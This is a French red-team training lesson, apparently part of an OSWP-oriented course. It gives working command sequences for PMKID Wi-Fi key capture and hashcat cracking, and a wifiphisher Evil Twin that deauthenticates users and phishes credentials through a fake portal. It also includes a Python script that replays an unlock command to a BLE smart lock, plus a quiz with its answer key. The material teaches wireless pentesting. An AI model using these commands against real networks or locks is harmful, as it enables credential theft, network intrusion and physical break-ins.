# TOME P6 — Cybersécurité Expert & Red Team Avancé — Jour 259 (6h) : Pentest Wi-Fi Avancé & Bluetooth Low Energy (WPA3 SAE, PMKID Attack, Rogue AP, BLE Sniffing & GATTack)

> [!NOTE]
> **Objectif du jour :** Maîtriser le **pentesting des réseaux sans-fil d'entreprise et des équipements IoT Bluetooth (BLE)** cibles de la certification **OSWP (Offensive Security Wireless Professional)** : exploiter les vulnérabilités WPA2/WPA3 (attaque PMKID sans client connecté, Dragonblood sur WPA3 SAE), déployer des **Rogue Access Points (Evil Twin)** avec captive portal, et analyser les communications Bluetooth Low Energy (BLE) via **GATTtool** et **Ubertooth**.
>
> **Compétences visées :** `WIFI-01` (A) — WPA2/WPA3 Enterprise Pentesting | `IoT-01` (A) — Bluetooth Low Energy (BLE) Auditing

---

## 1) Module — Pentest Wi-Fi WPA2/WPA3 & Attaque PMKID (2h30)

### 📖 Narration/Intuition

Historiquement, la capture d'un handshake WPA2 4-way nécessitait d'attendre (ou de forcer via déauthentification) la connexion d'un client légitime. L'**attaque PMKID** (découverte par Jens Steube / hashcat) révolutionne le pentest Wi-Fi : elle permet de capturer la clé de chiffrement candidate **directement auprès de l'Access Point**, sans qu'aucun client ne soit connecté au réseau !

### 🛠️ Atelier Pratique

**Attaque PMKID sans client connecté avec `hcxdumptool` & `hashcat` (`pmkid_attack.sh`) :**

```bash
# ═══════════════════════════════════════════════════════
# ÉTAPE 1 — Passage de la carte Wi-Fi en mode Monitor
# ═══════════════════════════════════════════════════════
sudo airmon-ng start wlan0
# Interface créée : wlan0mon

# ═══════════════════════════════════════════════════════
# ÉTAPE 2 — Capture du PMKID depuis l'Access Point (sans client)
# ═══════════════════════════════════════════════════════
# hcxdumptool écoute les trames EAPOL RSN PMKID émises par les APs
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --enable_status=1

# ═══════════════════════════════════════════════════════
# ÉTAPE 3 — Conversion du pcapng vers le format Hashcat (mode 22000)
# ═══════════════════════════════════════════════════════
hcxpcapngtool -o hashcat_pmkid.22000 pmkid_capture.pcapng

# ═══════════════════════════════════════════════════════
# ÉTAPE 4 — Cracking GPU du PMKID avec Hashcat (mode 22000)
# ═══════════════════════════════════════════════════════
hashcat -m 22000 hashcat_pmkid.22000 rockyou.txt -d 1

# Si le mot de passe est trouvé : PMKID cracked ! Pas besoin de 4-way handshake !
```

---

## 2) Module — Rogue Access Point & Evil Twin (1h30)

### 📖 Narration/Intuition

L'attaque **Evil Twin (Jumeau Maléfique)** consiste à créer un point d'accès Wi-Fi usurpant le SSID (nom de réseau) d'un réseau légitime d'entreprise. En envoyant des trames de désauthentification aux clients, ceux-ci se reconnectent automatiquement au Rogue AP de l'attaquant qui leur présente un faux portail captif pour voler leurs identifiants.

### 🛠️ Atelier Pratique

**Déploiement d'un Evil Twin avec `wifiphisher` (`evil_twin_attack.sh`) :**

```bash
# Lancement de Wifiphisher avec modèle de portail captif OAuth / Enterprise
sudo wifiphisher -aI wlan0mon -e "CORP_GUEST_WIFI" -p oauth_login

# Fonctionnement :
# 1) Wifiphisher désauthentifie les victimes de "CORP_GUEST_WIFI"
# 2) Il crée un Rogue AP avec le même SSID
# 3) Lorsque la victime se connecte, une page Web s'ouvre demandant les identifiants
```

---

## 3) Module — Pentest Bluetooth Low Energy (BLE) (2h)

### 📖 Narration/Intuition

Le **Bluetooth Low Energy (BLE)** est le protocole de communication sans-fil dominant des objets connectés (serrures connectées, capteurs médicaux, montres). Les appareils BLE exposent un profil **GATT (Generic Attribute Profile)** composé de Services et de Caractéristiques (lecture/écriture de valeurs hexadécimales).

### 🛠️ Atelier Pratique

**Audit d'une serrure connectée BLE avec `gatttool` & Python `bleak` (`ble_audit.py`) :**

```python
import asyncio
from bleak import BleakClient, BleakScanner

# Adresse MAC de la serrure connectée cible
LOCK_MAC = "AA:BB:CC:DD:EE:FF"

# UUID de la caractéristique de déverrouillage identifiée via GATT
UNLOCK_CHARACTERISTIC_UUID = "0000ffe1-0000-1000-8000-00805f9b34fb"

async def audit_ble_lock():
    print(f"[*] Connexion au périphérique BLE {LOCK_MAC}...")
    async with BleakClient(LOCK_MAC) as client:
        is_connected = await client.is_connected()
        print(f"[+] Connecté : {is_connected}")

        # Lired les services GATT
        for service in client.services:
            print(f"Service: {service.uuid}")
            for char in service.characteristics:
                print(f"  Characteristic: {char.uuid} (Properties: {char.properties})")

        # Envoi de la commande de déverrouillage brute (Replay Attack)
        unlock_command = bytes.fromhex("A55A0101FF")
        await client.write_gatt_char(UNLOCK_CHARACTERISTIC_UUID, unlock_command)
        print("[!] Commande de déverrouillage transmise sur GATT !")

asyncio.run(audit_ble_lock())
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **OSWP** | Offensive Security Wireless Professional — Certification officielle Wi-Fi hacking d'OffSec |
| **PMKID** | Pairwise Master Key Identifier — Attribut EAPOL permettant de cracker la clé Wi-Fi sans client |
| **BLE** | Bluetooth Low Energy — Version basse consommation du Bluetooth pour l'IoT |
| **GATT** | Generic Attribute Profile — Structure de données hiérarchique (Services/Caractéristiques) en BLE |
| **SAE** | Simultaneous Authentication of Equals — Mécanisme d'échange de clés de WPA3 (remplace PSK) |

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Quel est le principal avantage de l'attaque **PMKID** par rapport à la capture classique d'un 4-way handshake WPA2 ?
- A) Elle peut être exécutée directement contre le point d'accès sans qu'aucun client ne soit connecté au réseau
- B) Elle fonctionne sans carte Wi-Fi
- C) Elle ne nécessite pas d'utiliser Hashcat
- D) Elle déchiffre le mot de passe immédiatement sans dictionnaire

**Réponse : A**

**Q2 :** Quel mode Hashcat est spécifiquement utilisé pour cracker les fichiers de capture PMKID/WPA2 v22000 ?
- A) Mode `-m 22000`
- B) Mode `-m 1000`
- C) Mode `-m 0`
- D) Mode `-m 5600`

**Réponse : A**

**Q3 :** Dans le protocole Bluetooth Low Energy (BLE), comment se nomment les structures de données permettant la lecture et l'écriture de données sur un périphérique ?
- A) Les Caractéristiques GATT (GATT Characteristics)
- B) Les sockets TCP
- C) Les canaux Wi-Fi
- D) Les paquets IP

**Réponse : A**

**Q4 :** Quelle vulnérabilité majeure affecte l'échange de clés WPA3 SAE (Simultaneous Authentication of Equals) ?
- A) Les attaques Dragonblood (Side-Channel et Timing attacks sur l'élément de chasse)
- B) L'absence de chiffrement
- C) L'utilisation de MD5
- D) L'absence de mots de passe

**Réponse : A**

**Q5 :** Quel outil open-source permet de créer un Rogue Access Point (Evil Twin) associé à un faux portail captif de manière automatisée ?
- A) Wifiphisher / airgeddon
- B) Wireshark
- C) Nmap
- D) Metasploit

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
